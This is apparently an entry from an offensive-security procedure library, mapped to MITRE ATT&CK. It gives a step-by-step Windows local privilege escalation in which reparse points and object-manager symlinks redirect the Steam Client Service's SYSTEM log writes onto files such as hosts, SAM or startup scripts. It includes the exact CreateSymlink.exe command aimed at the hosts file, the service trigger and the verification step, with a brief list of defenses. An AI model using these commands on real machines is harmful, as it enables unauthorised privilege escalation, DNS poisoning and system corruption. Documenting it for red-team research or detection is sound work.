---
tags:
  - windows
  - symlink
  - lpe
  - file-write
type: procedure
tools:
  - '[[tools/create-symlink]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/create-symlink-redirection]]'
platforms:
  - Windows
techniques:
  - '[[Windows Service]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: b56ccc52-11a9-4862-a8b9-a03f657d37d6
created_at: '2025-12-14T17:26:48.995Z'
updated_at: '2025-12-14T17:26:48.995Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Windows Service]]'
---
# Create Symlinks to Redirect Steam Log Writes to Arbitrary Files

## Summary

This procedure leverages NTFS reparse points and object-directory symlinks to redirect the Steam service's log file creation from the controlled directory to an arbitrary target, allowing SYSTEM-privileged writes or appends with semi-controlled content from CRLF-injected logs.

## Description

Without admin rights, standard symlinks are restricted, but combining reparse points on a writable folder (`C:\test\logs` to `\RPC Control\`) and object-directory symlinks (`\RPC Control\service_log.txt` to target) bypasses this. When the service (as SYSTEM) writes the log, it follows the redirection. Impacts include appending to hosts for DNS poisoning, corrupting SAM for DoS, or injecting into startup scripts for EoP. Prerequisites: CRLF injection verified, empty logs folder.

## Requirements

1. Writable source folder (`C:\test\logs` empty)
2. [[tools/create-symlink]] utility downloaded
3. Target path accessible (e.g., for append, must be writable by SYSTEM)
4. No SeCreateSymbolicLink privilege needed due to technique

## Defense

Defensive measures and detection strategies:

- Disable object manager symlinks via registry (HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel\ObEnumerationNoDirectorySymlink=1)
- Monitor reparse point creation (fsutil reparsepoint query)
- Audit file appends to sensitive locations (SAM, hosts) via Sysmon

## Objectives

1. Redirect log writes to target
2. Achieve SYSTEM-privileged file modification
3. Validate with log content append

## Instructions

### Step 1: Prepare Source Folder

**Context**: Ensure logs is empty and writable.

**Command** (CMD):
```cmd
del /q C:\test\logs\*
```

> Directory cleared. Expected output: No files present.

### Step 2: Create Symlink Redirection

**Context**: Use the utility to set up reparse and symlink.

**Command** ([[commands/create-symlink-redirection]]):
```cmd
CreateSymlink.exe C:\test\logs\service_log.txt C:\Windows\System32\drivers\etc\hosts
```

> Symlink created. Expected output: 'Symlink created successfully' message.

### Step 3: Trigger Service Write

**Context**: Start service to generate redirected log.

**Command** (PowerShell):
```powershell
Start-Service -Name "Steam Client Service"
```

> Service writes to target. Expected output: Target file appended.

### Step 4: Verify Redirection

**Context**: Check target for appended content.

**Command** (CMD, example for hosts):
```cmd
type C:\Windows\System32\drivers\etc\hosts
```

> Shows log lines appended. Expected output: Semi-controlled content added as SYSTEM.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Windows Service]] Create or Modify System Process (Configuration File)

### Sub-Techniques

- None

## Commands Used

- [[commands/create-symlink-redirection]]

## Tools Used

- [[tools/create-symlink]]

## Tags

- [[windows]]
- [[symlink]]
- [[lpe]]
- [[file-write]]
